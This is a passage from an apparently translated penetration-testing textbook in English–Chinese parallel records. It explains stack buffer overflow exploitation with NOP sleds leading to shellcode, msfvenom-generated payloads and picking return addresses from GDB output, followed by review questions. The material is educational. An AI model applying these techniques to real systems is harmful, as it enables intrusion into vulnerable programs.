    as it’s supposed to; what it doesn’t realize is that we overwrote that address,
    and it will now faithfully jump to the NOP sled we just stuffed into the buffer.
    The NOP sled is nothing more than a long string of *no-operation* codes. If execution
    lands there, the processor will just blow through them doing nothing before moving
    on to the next instruction. Execution lands at the top of a hill and almost literally
    slides down the hill. At the bottom of the hill is our shellcode. This method
    means we don’t need to be accurate with our prediction of a return address – it
    simply has to land anywhere in the NOPs.
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: 整个红色框就是我们要填充到缓冲区中的内容。正如你所看到的，它根本无法完全适应；它会*溢出*缓冲区框，进入下面的空间，包括返回地址，我们将其指向 NOP
    滑道的中间。执行流会到达返回地址并跳转到那里，以为它正在按预期返回；它没有意识到的是，我们已经覆盖了那个地址，它现在会忠实地跳转到我们刚刚填充进缓冲区的 NOP
    滑道。NOP 滑道只不过是一长串*无操作*的代码。如果执行流落在那里，处理器将直接跳过这些指令，什么也不做，直到执行到下一条指令。执行就像从山顶滑下去一样，几乎字面意义上滑下山坡。山坡的底部就是我们的
    shellcode。这种方法意味着我们不需要精确预测返回地址——它只需要落在 NOP 区域的任何位置。
- en: The NOP code **\x90** is the most popular, but as with many things in defense,
    the roads most traveled are the ones most easily blocked. However, you are able
    to pass a NOP flag to **msfvenom** and it will generate a sled made up of a variety
    of NOP codes for you. Regardless of the method you use, you need to know the length
    of the NOP sled. If it’s too long, you’ll just end up overwriting RET with a portion
    of shellcode, which is probably a segmentation fault. We already know that our
    buffer is 300 bytes, and our payload is 150 bytes. In theory, stuffing exactly
    half of the buffer with NOPs should allow us to overwrite the return address precisely.
    So, where do we point the return? Well, anywhere really, as long as you aim for
    the NOP sled. Any address in that range will work.
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: NOP 代码**\x90**是最流行的，但就像防御中的许多事情一样，走得最多的路也是最容易被封堵的。不过，你可以传递一个 NOP 标志给**msfvenom**，它将为你生成由多种
    NOP 代码组成的滑道。无论你使用哪种方法，你需要知道 NOP 滑道的长度。如果它太长，你只会用部分 shellcode 来覆盖 RET，这可能会导致段错误。我们已经知道我们的缓冲区是
    300 字节，而有效负载是 150 字节。理论上，将缓冲区的正好一半填充 NOP 应该能精确覆盖返回地址。那么，我们应该指向哪里呢？实际上，任何地方都可以，只要你瞄准
    NOP 滑道。那个范围内的任何地址都可以工作。
- en: 'Let’s again use the hexadecimal examination command in GDB to observe the stack
    after you stuff the NOP sled:'
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们再次使用 GDB 中的十六进制检查命令，观察你填充 NOP sled 后的栈情况：
- en: '![Figure 10.13 – NOP sled directing us to shellcode ](image/Figure_10.13_B17616.jpg)'
  id: totrans-162
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.13 – NOP sled 将我们引导到 shellcode](image/Figure_10.13_B17616.jpg)'
- en: Figure 10.13 – NOP sled directing us to shellcode
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.13 – NOP sled 将我们引导到 shellcode
- en: Here, we’ve highlighted our sledding hill. Now we know that any target between
    **0xbffff344** and **0xbffff3d7** will land us in our NOP sled, and we’ll slide
    right into shellcode execution.
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 这里，我们标出了我们的滑雪坡。现在我们知道，在**0xbffff344**到**0xbffff3d7**之间的任何目标都会使我们进入 NOP sled，然后我们将滑入
    shellcode 执行。
- en: Now we can use what we’ve learned to be flexible with different executables
    in different environments. Try these steps again with a different C program that
    also contains a vulnerable buffer, so that you’ll be working with different values.
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们可以利用所学的知识，在不同环境下灵活地处理不同的可执行文件。再次尝试这些步骤，使用一个包含易受攻击缓冲区的不同 C 程序，这样你将处理不同的值。
- en: Summary
  id: totrans-166
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 摘要
- en: In this chapter, we learned the basics of low-level memory management during
    the execution of a program. We learned how to examine the finer points of what’s
    happening during execution, including how to temporarily pause execution so we
    can examine memory in detail. We covered some basic introductory knowledge on
    assembly language and debugging to not only complete the study in this chapter
    but to prepare for the work ahead in later chapters. We wrote up a quick and vulnerable
    C program to demonstrate stack overflow attacks. Once we understood the program
    at the stack level, we generated a payload in pure hexadecimal opcodes with **msfvenom**.
    To prepare this payload for the target, we learned how to manually search for
    and remove code-breaking shellcode.
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们学习了程序执行过程中低级内存管理的基础知识。我们学会了如何检查执行过程中的细节，包括如何暂时暂停执行，以便我们可以详细检查内存。我们介绍了一些关于汇编语言和调试的基本知识，不仅完成了本章的学习，也为后续章节的工作做好了准备。我们编写了一个简单且易受攻击的
    C 程序，演示栈溢出攻击。一旦我们理解了栈级别的程序，我们就使用**msfvenom**生成了一个纯十六进制操作码的有效负载。为了准备这个有效负载进入目标，我们学会了如何手动查找并移除破坏代码的
    shellcode。
- en: Coming up in the next chapter, we’re going to look at how these principles have
    caused defenders to evolve, and the innovative solution of return-oriented programming.
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章，我们将讨论这些原理如何促使防御者的进化，以及返回导向编程（ROP）这一创新解决方案。
- en: Questions
  id: totrans-169
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 问题
- en: 'Answer the following questions to test your knowledge of this chapter:'
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 回答以下问题，测试你对本章内容的理解：
- en: The stack is a ______, or LIFO, structure.
  id: totrans-171
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 栈是一个________，即后进先出（LIFO）结构。
- en: For this list of generic registers, identify which one of the eight is not listed
    – **EAX**, **EBX**, **ECX**, **EDX**, **EBP**, **ESI**, **EDI**.
  id: totrans-172
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 对于这个通用寄存器列表，找出未列出的八个寄存器中的哪一个——**EAX**、**EBX**、**ECX**、**EDX**、**EBP**、**ESI**、**EDI**。
- en: In AT&T assembly language notation, the operand order when copying data from
    one place to another is _________.
  id: totrans-173
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在 AT&T 汇编语言符号中，从一个地方复制数据到另一个地方时的操作数顺序是________。
- en: '**jnz** causes execution to jump to the specified address if the value of **EBX**
    is equal to zero. (True | False)'
  id: totrans-174
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '**jnz** 会导致执行跳转到指定的地址，如果 **EBX** 的值为零。（对 | 错）'
- en: The memory space between the base pointer and the stack pointer is the ________.
  id: totrans-175
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 基址指针和栈指针之间的内存空间是________。
- en: The **\x90** opcode notoriously breaks shellcode. (True | False)
  id: totrans-176
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '**\x90** 操作码臭名昭著地破坏了 shellcode。（对 | 错）'
- en: What does little-endian mean?
  id: totrans-177
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 什么是小端（little-endian）？
- en: Further reading
  id: totrans-178
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 进一步阅读
- en: 'For more information regarding the topics that were covered in this chapter,
    take a look at the following resources:'
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: 若要了解更多关于本章涵盖主题的信息，请查看以下资源：
- en: '*Smashing the stack for fun and profit*, a notorious discussion of stack overflow
    attacks ([http://www.phrack.org/issues/49/14.xhtml#article](http://www.phrack.org/issues/49/14.xhtml#article))'
  id: totrans-180
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '*为了乐趣和利益，砸栈*，这是对栈溢出攻击的臭名昭著讨论（[http://www.phrack.org/issues/49/14.xhtml#article](http://www.phrack.org/issues/49/14.xhtml#article)）'
- en: '*Practical Reverse Engineering: x86, x64, ARM, Windows Kernel, Reversing Tools,
    and Obfuscation*, Dang, Bruce, Alexandre Gazet, and Elias Bachaalany by John Wiley
    and Sons, 2014.'
  id: totrans-181
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '*实用逆向工程：x86、x64、ARM、Windows 内核、逆向工具和混淆*，Dang、Bruce、Alexandre Gazet 和 Elias
    Bachaalany 著，John Wiley and Sons，2014年。'
